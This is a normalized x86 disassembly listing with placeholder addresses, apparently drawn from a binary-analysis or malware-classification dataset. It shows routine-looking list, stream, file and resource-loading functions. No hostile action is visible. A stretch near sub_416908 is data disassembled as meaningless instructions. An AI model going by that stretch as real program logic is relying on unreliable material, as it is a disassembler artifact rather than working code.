mov eax ebx
call sub_414e40
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_414e40
cmp esi [ ebx + 0x14 ]
jle r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x88 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_415c08
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x14 ]
cmp eax [ ebx + 0x18 ]
jne r-xdata
mov eax [ ebx + 0x14 ]
cmp esi eax
jge r-xdata
mov eax ebx
call sub_415b34
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 ]
mov esi eax
xor eax eax
mov [ esi ] eax
mov eax [ ebp + 0x8 ]
mov [ esi + 0x4 ] eax
mov eax esi
mov edx edi
call sub_4040c8
inc [ ebx + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov edx [ ebx + 0x10 ]
lea edx [ edx + esi * 8 + 0x8 ]
push edx
mov edx [ ebx + 0x10 ]
lea edx [ edx + esi * 8 ]
sub eax esi
mov ecx eax
shl ecx 0x3
mov eax edx
pop edx
call sub_4028c8
sub_415c80
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
je r-xdata
test esi esi
jl r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_414e40
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_414e40
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 ]
mov edx edi
call sub_4040c8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_415cdc
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_414e40
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
mov [ eax + esi * 8 + 0x4 ] edi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_415d1c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call [ ebp + 0x8 ]
test eax eax
jl r-xdata
inc ebx
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call [ ebp + 0x8 ]
test eax eax
jg r-xdata
dec esi
cmp esi ebx
jl r-xdata
cmp esi ebx
jge r-xdata
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_415a34
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp esi [ ebp - 0x8 ]
jle r-xdata
cmp esi [ ebp - 0x10 ]
jne r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
mov [ ebp - 0x8 ] ebx
cmp ebx [ ebp - 0xc ]
jl r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_415d1c
inc ebx
dec esi
mov [ ebp - 0x10 ] ebx
mov ebx [ ebp - 0x8 ]
mov esi [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0xc ]
shr eax 0x1
mov [ ebp - 0x10 ] eax
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_415dcc
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x1c ]
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov [ esi + 0x1c ] bl
mov eax esi
mov edx [ eax ]
call [ edx + 0x90 ]
sub_415e28
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x14 ] 0x1
jle r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
push esi
mov ecx [ ebx + 0x14 ]
dec ecx
xor edx edx
mov eax ebx
call sub_415d1c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
sub_415e7c
add esp 0xfffffff8
push 0x0
push 0x0
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp ] eax
mov [ esp + 0x4 ] edx
mov eax [ esp ]
mov edx [ esp + 0x4 ]
pop ecx
pop edx
retn
sub_415eb0
push ebx
add esp 0xfffffff0
mov ebx eax
push 0x0
push 0x0
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
push 0x0
push 0x0
mov dl 0x2
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp ] eax
mov [ esp + 0x4 ] edx
push [ esp + 0xc ]
push [ esp + 0xc ]
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ esp ]
mov edx [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_415f14
push ebp
mov ebp esp
mov ecx eax
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
jl r-xdata
cmp [ ebp + 0x8 ] 0x80000000
jb r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6f8
call sub_403a2c
cmp [ ebp + 0xc ] 0x0
jne r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x8 ]
mov edx eax
mov eax ecx
mov ecx [ eax ]
call [ ecx + 0x4 ]
pop ebp
retn 0x8
jmp r-xdata
sub_415f68
push ebp
mov ebp esp
add esp 0xfffffef8
lea edx [ ebp - 0x108 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
call sub_4031f0
lea eax [ ebp - 0x108 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x4
lea eax [ ebp - 0x8 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b734
call sub_403a2c
mov esp ebp
pop ebp
retn
sub_415fb4
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
mov [ ebp - 0x1a ] cx
mov esi edx
mov [ ebp - 0x4 ] eax
lea ebx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ eax ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
call sub_4031e8
mov [ ebx ] eax
jmp r-xdata
cmp [ ebx ] 0x0
je r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
cmp eax [ r-xdata ]
jne r-xdata
mov [ ebp - 0x14 ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
push ebp
call sub_415f68
pop ecx
mov eax [ ebx ]
call sub_40322c
mov [ ebx ] eax
mov eax esi
cdq
push edx
push eax
mov dl [ ebp - 0x1a ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ebp
call sub_415f68
pop ecx
sub_416038
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
jl r-xdata
cmp [ ebp + 0x8 ] 0x80000000
jb r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6f8
call sub_403a2c
cmp [ ebp + 0xc ] 0x0
jne r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x8 ]
mov edx eax
xor ecx ecx
mov cl bl
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x14 ]
cdq
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
jmp r-xdata
sub_4160a8
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov ecx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0xc ]
cmp ebx eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6f8
call sub_403a2c
sub_4160e0
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov ecx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x10 ]
cmp ebx eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6f8
call sub_403a2c
sub_416118
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0xf000
jbe r-xdata
push 0x0
push 0x0
mov eax edi
call sub_415e9c
mov eax edi
mov edx [ eax ]
call [ edx ]
mov [ ebp + 0x8 ] eax
mov [ ebp + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x14 ] 0xf000
jmp r-xdata
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x14 ]
call sub_4026cc
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_4161f4
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x14 ]
cdq
cmp edx [ ebp + 0xc ]
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
jge r-xdata
cmp eax [ ebp + 0x8 ]
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4161fb
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
call sub_4026ec
retn
mov ebx [ ebp + 0x8 ]
mov ebx [ ebp - 0x14 ]
jmp r-xdata
jmp r-xdata
mov esi [ ebp - 0x18 ]
mov edx esi
mov ecx ebx
mov eax edi
call sub_4160a8
mov edx esi
mov ecx ebx
mov eax [ ebp - 0x4 ]
call sub_4160e0
mov eax ebx
cdq
sub [ ebp + 0x8 ] eax
sbb [ ebp + 0xc ] edx
sub_41620c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx edx
push 0x1000
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_416890
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41625c
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_4188c4
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416263
mov eax [ ebp - 0x8 ]
call sub_4032a0
retn
sub_41626c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403270
mov [ edi + 0x4 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035c4
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
sub_4162c8
push ebp
mov ebp esp
add esp 0xfffffff8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
and edx 0x7f
mov eax [ eax + 0x4 ]
call sub_40848c
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop ecx
pop ecx
pop ebp
retn 0x8
sub_416308
push ebp
mov ebp esp
push ebx
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ ebx + 0x4 ]
push eax
call SetEndOfFile
call sub_40cb5c
pop ebx
pop ebp
retn 0x8
sub_416330
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov ax [ ebp + 0x8 ]
push eax
push 0x0
xor edx edx
mov eax esi
call sub_416374
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035c4
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
sub_416374
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x1c ] ebx
test dl dl
je r-xdata
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov edi [ ebp + 0xc ]
xor eax eax
push ebp
push sub_41649d
push [ fs : eax ]
mov [ fs : eax ] esp
cmp di 0xffff
jne r-xdata
add esp 0xfffffff0
call sub_4035c4
movzx edx di
mov eax esi
call sub_4083b0
mov ecx eax
xor edx edx
mov eax ebx
call sub_41626c
cmp [ ebx + 0x4 ] 0x0
jge r-xdata
mov edx [ ebp + 0x8 ]
mov eax esi
call sub_40842c
mov ecx eax
xor edx edx
mov eax ebx
call sub_41626c
cmp [ ebx + 0x4 ] 0x0
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4164a4
lea eax [ ebp - 0x24 ]
mov edx 0x4
call sub_404098
retn
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_408644
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
call GetLastError
lea edx [ ebp - 0x24 ]
call sub_40ae34
mov eax [ ebp - 0x24 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0x14 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b734
call sub_403a2c
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_408644
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
call GetLastError
lea edx [ ebp - 0x1c ]
call sub_40ae34
mov eax [ ebp - 0x1c ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0x14 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b734
call sub_403a2c
jmp r-xdata
sub_4164a4
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
sub_4164c8
push ebx
push esi
call sub_40362c
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
test eax eax
jl r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403290
test bl bl
jle r-xdata
call sub_4084c4
pop esi
pop ebx
retn
mov eax esi
call sub_403614
sub_416504
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0xc ]
test edi edi
jl r-xdata
xor esi esi
test ecx ecx
jl r-xdata
mov esi [ ebx + 0x8 ]
sub esi edi
test esi esi
jle r-xdata
cmp ecx esi
jge r-xdata
mov eax [ ebx + 0x4 ]
add eax edi
mov ecx esi
call sub_4028c8
add [ ebx + 0xc ] esi
jmp r-xdata
mov esi ecx
mov eax esi
pop edi
pop esi
pop ebx
retn
sub_41653c
sub cx 0x1
jb r-xdata
mov [ eax + 0xc ] edx
jmp r-xdata
je r-xdata
mov eax [ eax + 0xc ]
retn
add [ eax + 0xc ] edx
jmp r-xdata
dec cx
je r-xdata
add edx [ eax + 0x8 ]
mov [ eax + 0xc ] edx
jmp r-xdata
sub_416560
push ebx
push esi
call sub_40362c
mov ebx edx
mov esi eax
mov eax esi
call sub_41658c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403290
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403614
sub_4165a4
push ebx
push esi
push edi
mov edi edx
mov esi eax
push 0x0
push 0x0
mov eax edi
call sub_415e9c
mov eax edi
mov edx [ eax ]
call [ edx ]
mov ebx eax
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x4 ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ esi + 0x4 ]
mov ecx ebx
mov eax edi
call sub_4160a8
sub_4165dc
push ebx
push ecx
mov [ esp ] edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov edx eax
mov ecx [ ebx + 0x8 ]
mov eax ebx
call sub_4164fc
mov eax [ esp ]
mov [ ebx + 0x10 ] eax
pop edx
pop ebx
retn
sub_416604
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0xc ]
mov edx esi
mov eax ebx
call sub_4165dc
mov [ ebx + 0x8 ] esi
cmp esi edi
jge r-xdata
pop edi
pop esi
pop ebx
retn
mov cx 0x2
xor edx edx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x14 ]
sub_416630
push ebx
push esi
push edi
cmp [ edx ] 0x0
jle r-xdata
mov esi [ eax + 0x4 ]
mov ecx esi
mov edi [ edx ]
mov ebx [ eax + 0x10 ]
cmp edi ebx
je r-xdata
mov ecx [ edx ]
cmp ecx [ eax + 0x8 ]
je r-xdata
mov eax ecx
pop edi
pop esi
pop ebx
retn
cmp [ edx ] 0x0
jne r-xdata
mov ecx [ edx ]
add ecx 0x1fff
and ecx 0xffffe000
mov [ edx ] ecx
test ebx ebx
jne r-xdata
mov eax esi
call sub_406ad0
xor ecx ecx
jmp r-xdata
mov ecx [ rw-data ]
movzx ecx [ ecx ]
mov edx [ edx ]
mov eax esi
call sub_406ab4
mov ecx eax
mov eax [ rw-data ]
movzx eax [ eax ]
mov edx [ edx ]
call sub_406aa4
mov ecx eax
jmp r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6f8
call sub_403a2c
test ecx ecx
jne r-xdata
sub_4166bc
push ebx
push esi
push edi
push ebp
mov esi ecx
mov ebp edx
mov ebx eax
mov eax [ ebx + 0xc ]
test eax eax
jl r-xdata
xor eax eax
test esi esi
jl r-xdata
mov edi eax
add edi esi
test edi edi
jle r-xdata
cmp edi [ ebx + 0x8 ]
jle r-xdata
mov edx [ ebx + 0x4 ]
add edx [ ebx + 0xc ]
mov eax ebp
mov ecx esi
call sub_4028c8
mov [ ebx + 0xc ] edi
mov eax esi
jmp r-xdata
cmp edi [ ebx + 0x10 ]
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ ebx + 0x8 ] edi
mov edx edi
mov eax ebx
call sub_4165dc
sub_41670c
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403270
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
call sub_404534
mov ecx eax
mov edx esi
mov eax edi
call sub_4167d4
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035c4
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
sub_416764
push ebp
mov ebp esp
add esp 0xfffffff4
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4167c7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x6
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405ba4
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b678
call sub_403a2c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4167ce
lea eax [ ebp - 0xc ]
call sub_404074
retn
sub_4167d4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push esi
call FindResourceA
mov edi eax
mov [ ebx + 0x10 ] edi
test edi edi
jne r-xdata
mov eax [ ebx + 0x10 ]
push eax
push esi
call LoadResource
mov edi eax
mov [ ebx + 0x14 ] edi
test edi edi
jne r-xdata
push ebp
call sub_416764
pop ecx
mov eax [ ebx + 0x10 ]
push eax
push esi
call SizeofResource
push eax
mov eax [ ebx + 0x14 ]
push eax
call LockResource
mov edx eax
mov eax ebx
pop ecx
call sub_4164fc
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
push ebp
call sub_416764
pop ecx
sub_416840
push ebx
push esi
call sub_40362c
mov ebx edx
mov esi eax
mov eax [ esi + 0x14 ]
call sub_406aa0
mov eax [ esi + 0x14 ]
push eax
call FreeResource
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403290
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403614
sub_416890
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
mov esi [ ebp + 0x8 ]
mov [ edi + 0x4 ] ecx
mov eax esi
call sub_4026cc
mov [ edi + 0x8 ] eax
mov [ edi + 0xc ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035c4
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
sub_4168d8
push ebx
push esi
call sub_40362c
mov ebx edx
mov esi eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
test bl bl
jle r-xdata
mov edx [ esi + 0xc ]
call sub_4026ec
pop esi
pop ebx
retn
mov eax esi
call sub_403614
sub_416908
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push esp
imul eax [ ecx ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsb
imul eax [ ecx ] 0x18
mov al [ 0xffffffffe8004010 ]
xor al 0x40
add ah dh
xor al 0x40
add al bh
xor al 0x40
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
nop
xor al [ eax ]
jl r-xdata
cmp [ edx ] dh
inc eax
add [ edx + esi + 0x40 ] dl
add [ eax - 0x73ffbfce ] dl
push 0x41
inc ecx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x100040 ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
adc al 0x0
add [ eax ] al
or dl [ eax + edx * 2 + 0x72 ]
outsd
jo r-xdata
fsubp st3
add [ ebx - 0x76 ] eax
adc eax [ edx + edx * 8 - 0x157ffa8c ]
r-xdata
jo r-xdata
add [ esi ] cl
push esp
push eax
jb r-xdata
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
nop
xor al [ eax ]
mov [ edx + 0x41 ] gs
imul edi [ eax + 0x75 ] r-xdata
enter 0x4169 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
inc ebx
cmp [ ebx ] 0x0
je r-xdata
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
outsb
je r-xdata
sub dl 0x2e
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp ebx
sub ebp esi
mov ecx ebp
lea eax [ edi + 0x10 ]
mov edx esi
call sub_404164
mov ecx ebp
inc ecx
lea eax [ edi + 0x14 ]
mov edx 0x1
call sub_4045d4
mov al 0x1
mov esi [ edi + 0x14 ]
mov ebx esi
jmp r-xdata
inc esi
imul edi [ eax + 0x75 ] 0x8b559070
in al dx
push ebx
push esi
test dl dl
je r-xdata
mov dl [ ebx ]
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x4 ] ecx
mov eax [ ebp + 0x14 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0x10 ]
mov [ esi + 0xc ] eax
lea eax [ esi + 0x10 ]
mov edx [ ebp + 0xc ]
call sub_4040c8
lea eax [ esi + 0x14 ]
mov edx [ ebp + 0x8 ]
call sub_4040c8
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035c4
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x10
sub_4169dc
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x4 ] ecx
mov eax [ ebp + 0x14 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0x10 ]
mov [ esi + 0xc ] eax
lea eax [ esi + 0x10 ]
mov edx [ ebp + 0xc ]
call sub_4040c8
lea eax [ esi + 0x14 ]
mov edx [ ebp + 0x8 ]
call sub_4040c8
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035c4
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x10
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
sub_416a34
push ebx
push esi
push edi
push ebp
mov edi eax
xor eax eax
mov esi [ edi + 0x14 ]
mov ebx esi
jmp r-xdata
mov dl [ ebx ]
test dl dl
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
sub dl 0x2e
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp ebx
sub ebp esi
mov ecx ebp
lea eax [ edi + 0x10 ]
mov edx esi
call sub_404164
mov ecx ebp
inc ecx
lea eax [ edi + 0x14 ]
mov edx 0x1
call sub_4045d4
mov al 0x1
inc ebx
sub_416a8c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_416b03
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_4056e0
test esi esi
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
call sub_411100
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416b0a
lea eax [ ebp - 0x4 ]
call sub_4056e0
retn
mov eax [ ebx + 0xc ]
mov eax [ eax ]
mov eax [ eax ]
call sub_410a10
add eax 0x5
push eax
lea eax [ ebp - 0x4 ]
call sub_4056e0
mov ecx eax
mov eax esi
pop edx
call sub_40d050
test al al
jne r-xdata
lea eax [ ebp - 0x4 ]
call sub_4056e0
sub_416b10
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_416bb6
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416bbd
lea eax [ ebp - 0x8 ]
call sub_404074
retn
mov edi esi
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax ebx
jmp r-xdata
mov [ ebp - 0x4 ] edi
mov dl [ ebx ]
test dl dl
je r-xdata
mov ecx ebx
sub ecx eax
lea edx [ ebp - 0x8 ]
xchg edx eax
call sub_404164
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_41a5ec
mov esi eax
test esi esi
jne r-xdata
add dl 0xd3
sub dl 0x2
jae r-xdata
test esi esi
je r-xdata
mov edx r-xdata
mov eax [ ebp - 0x8 ]
call sub_407e18
test al al
je r-xdata
inc ebx
cmp [ ebx ] 0x2e
jne r-xdata
mov esi edi
cmp [ ebx ] 0x2d
jne r-xdata
inc ebx
cmp [ ebx ] 0x3e
jne r-xdata
inc ebx
mov edi esi
inc ebx
sub_416bd8
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_413e40
test eax eax
jge r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_413e40
test eax eax
jl r-xdata
mov eax [ ebp + 0x8 ]
